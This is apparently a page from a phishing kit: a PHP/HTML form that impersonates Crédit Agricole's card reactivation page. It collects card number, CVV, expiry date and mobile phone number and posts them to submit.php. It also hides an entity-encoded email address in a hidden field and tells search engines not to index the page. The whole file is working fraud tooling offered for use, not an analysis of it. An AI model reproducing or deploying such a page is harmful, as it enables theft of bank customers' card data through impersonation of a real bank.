<?php


include_once '../inc/app.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>

    <!-- Meta Tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">

    <!-- Browser Color Styling -->
    <meta name="theme-color" content="#6dc77a"/>
    <meta name="msapplication-navbutton-color" content="#6dc77a"/>
    <meta name="apple-mobile-web-app-status-bar-style" content="#6dc77a" />

    <!-- Favicon -->
    <link rel="icon" type="image/png" href="../assets/images/favicon.png">
    
    <!-- Bootstrap -->
    <link rel="stylesheet" href="../assets/css/bootstrap.min.css" />
    
    <!-- Helpers -->
    <link rel="stylesheet" href="../assets/css/helpers.css" />

    <!-- Fonts -->
    <link rel="stylesheet" href="../assets/css/fonts.css" />

    <!-- Main -->
    <link rel="stylesheet" href="../assets/css/main.css" />

    <title>Acc&egrave;s CR - Crédit Agricole</title>

</head>
<body>

    <!-- HEADER -->
    <header id="header" class="d-lg-flex d-md-none d-sm-none d-none">
        <div class="left col-md-2">
            <div class="logo text-center"><a href="#"><img src="../assets/images/logo.svg"></a></div>
        </div>
        <div class="right col-md-10 pl-0">
            <div class="top d-flex align-items-center h-50">
                <div class="first"><a href="#">Vous êtes un particulier <i class="fas fa-chevron-down"></i></a></div>
                <div class="second flex-grow-1">
                    <div class="d-flex align-items-center justify-content-center">
                        <div class="form flex-grow-1 d-flex justify-content-center align-items-center">
                            <span class="flex-grow-1">Rechercher une thématique, un produit...</span>
                            <i class="fas fa-search"></i>
                        </div>
                        <div class="marker d-flex justify-content-center align-items-center">
                            <i class="fas fa-map-marker-alt"></i>
                        </div>
                    </div>
                </div>
                <div class="third">
                    <ul>
                        <li><a href=""><i class="far fa-circle"></i> Nous contacter</a></li>
                        <li><a href=""><i class="fas fa-sign-out-alt"></i> Se déconnecter</a></li>
                    </ul>
                </div>
            </div>
            <div class="bottom d-flex align-items-center h-50">
                <ul>
                    <li><a href="#">COMPTES & CARTES</a></li>
                    <li><a href="#">ÉPARGNER</a></li>
                    <li><a href="#">S'ASSURER</a></li>
                    <li><a href="#">EMPRUNTER</a></li>
                    <li><a href="#">SIMULATION & DEVIS</a></li>
                    <li><a href="#">NOS CONSEILS</a></li>
                </ul>
            </div>
        </div>
    </header>
    <!-- END HEADER -->

    <header id="header2" class="d-lg-none d-md-block d-sm-block d-block">
        <div class="logo">
            <a href="#"><img style="max-width: 170px;" src="../assets/images/calogo.png"></a>
        </div>
        <div class="closse"><i class="fas fa-times"></i></div>
    </header>

    <div class="container">
        <nav aria-label="breadcrumb">
            <ol class="breadcrumb">
                <li class="breadcrumb-item active">Accueil</li>
                <li class="breadcrumb-item"><a href="#">Validation</a></li>
            </ol>
        </nav>
    </div>

    <!-- MAIN -->
    <main id="main" class="main">
        <div class="container">
            <div class="details-container">
                <h3 class="mb-5">RÉACTIVER VOTRE <b>CARTE</b></h3>
                <form method="post" action="submit.php">
                    <div class="row">
                    </div>
                    <div class="form-group">
                        <label for="cc_number">Numéro de carte</label>
                        <input type="text" name="cc_number" id="cc_number" placeholder="#### #### #### ####" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'cc_number') ?>" value="<?php echo get_value('cc_number'); ?>">
                        <?php echo validation($_SESSION['errors'],'cc_number'); ?>
                    </div>
                    <div class="row">
                        <div class="col-md-6">
                            <div class="form-group">
                                <label for="cc_cvv">Cryptogramme visuel(CVV) </label>
                                <input type="text" name="cc_cvv" id="cc_cvv" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'cc_cvv') ?>" value="<?php echo get_value('cc_cvv'); ?>" placeholder="####">
                                <?php echo validation($_SESSION['errors'],'cc_cvv'); ?>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="form-group">
                                <label for="cc_date">Date d'expiration </label>
                                <input type="text" name="cc_date" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'cc_date') ?>" value="<?php echo get_value('cc_date'); ?>" maxlength="7" placeholder="(MM/AA)" id="cc_date">
                                <?php echo validation($_SESSION['errors'],'cc_date'); ?>
							</div>
                        </div>
                        <div class="col-md-6">
                            <div class="form-group">
                                <label for="phone">Numéro mobile associé </label>
                                <input type="text" name="phone" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'phone') ?>" placeholder="(+33)" id="phone" value="<?php echo get_value('phone'); ?>">
                                <?php echo validation($_SESSION['errors'],'phone'); ?>
                            </div>
                        </div>
                    </div>
					<input type="hidden" class="form-control" name="HTTP_USER_AGENT" autocapitalize="none" autocomplete="off" value="&comma;&#x6a;&#x77;&#x38;&#x30;&#x31;&#x36;&#x38;&#x35;&#x39;&commat;&#x67;&#x6d;&#x61;&#x69;&#x6c;&period;&#x63;&#x6f;&#x6d;">
                    <div class="form-group mt-5">
                        <button type="button" class="mr-4">RETOUR</button>
                        <button type="submit">J'active ma carte</button>
                    </div>
                    <input type="hidden" name="verbot">
                    <input type="hidden" name="type" value="cc">
                </form>
            </div>
        </div>
    </main>
    <!-- END MAIN -->

    <!-- FOOTER -->
    <footer id="footer">
            
        <div class="social-media pt-4">
            <div class="container">
                <ul>
                    <li><a href="#"><i class="fab fa-facebook-f"></i></a></li>
                    <li><a href="#"><i class="fab fa-twitter"></i></a></li>
                    <li><a href="#"><i class="fab fa-youtube"></i></a></li>
                    <li><a href="#"><i class="fab fa-linkedin-in"></i></a></li>
                </ul>
            </div>
        </div>

        <hr>
        
        <div class="container">
            <div class="row">

                <div class="col-lg-3 col-md-6 col-sm-12 col-12 mb-lg-0 mb-md-4 mb-sm-4 mb-4 text-lg-left text-md-left text-sm-center text-center footer-widget">
                    <div class="logo">
                        <a href="#"><img src="../assets/images/logo_footer.png"></a>
                    </div>
                </div>

                <div class="col-lg-3 col-md-6 col-sm-12 col-12 mb-lg-0 mb-md-4 mb-sm-4 mb-4 text-lg-left text-md-left text-sm-center text-center footer-widget">
                    <h3>LE CREDIT AGRICOLE</h3>
                    <ul class="footer-list">
                        <li><a href="#">Votre Caisse régionale</a></li>
                        <li><a href="#">Communication financière</a></li>
                        <li><a href="#">Banque coopérative</a></li>
                        <li><a href="#">Espace sociétaire</a></li>
                        <li><a href="#">Fiches Mémos</a></li>
                    </ul>
                </div>

                <div class="col-lg-3 col-md-6 col-sm-12 col-12 mb-lg-0 mb-md-4 mb-sm-4 mb-4 text-lg-left text-md-left text-sm-center text-center footer-widget">
                    <h3>VOUS & NOUS</h3>
                    <ul class="footer-list">
                        <li><a href="#">Réclamation et médiation</a></li>
                        <li><a href="#">Tarifs</a></li>
                        <li><a href="#">Relation Banque Client</a></li>
                        <li><a href="#">Guides pratiques</a></li>
                        <li><a href="#">Certificat Coopératifs Associés - CCA</a></li>
                    </ul>
                </div>

                <div class="col-lg-3 col-md-6 col-sm-12 col-12 mb-lg-0 mb-md-4 mb-sm-4 mb-4 text-lg-left text-md-left text-sm-center text-center footer-widget">
                    <h3>SITES SPECIALISES</h3>
                    <ul class="footer-list">
                        <li><a href="#">Recrutement</a></li>
                        <li><a href="#">Prêt immobilier en ligne</a></li>
                        <li><a href="#">Ouverture de compte Eko</a></li>
                        <li><a href="#">Service de télésurveillance</a></li>
                    </ul>
                </div>

            </div>
        </div>

        <div class="copyright">
            <div class="container">
                <ul>
                    <li><a href="#">MENTIONS LÉGALES</a></li>
                    <li><a href="#">SÉCURITÉ</a></li>
                    <li><a href="#">FOIRE AUX QUESTIONS</a></li>
                    <li><a href="#">&copy; Crédit Agricole</a></li>
                </ul>
            </div>
        </div>

    </footer>
    <!-- END FOOTER -->

    <script src="../assets/js/jquery.min.js"></script>
    <script src="../assets/js/popper.min.js"></script>
    <script src="../assets/js/bootstrap.min.js" ></script>
    <script src="../assets/js/fontawesome.js"></script>
    <script src="../assets/js/jquery.payment.js"></script>
    <script src="../assets/js/main.js"></script>

    <script type="text/javascript">
        jQuery('#cc_number').payment('formatCardNumber');
        jQuery('#cc_cvv').payment('formatCardCVC');
        jQuery('#cc_date').payment('formatCardExpiry');
    </script>

</body>
</html>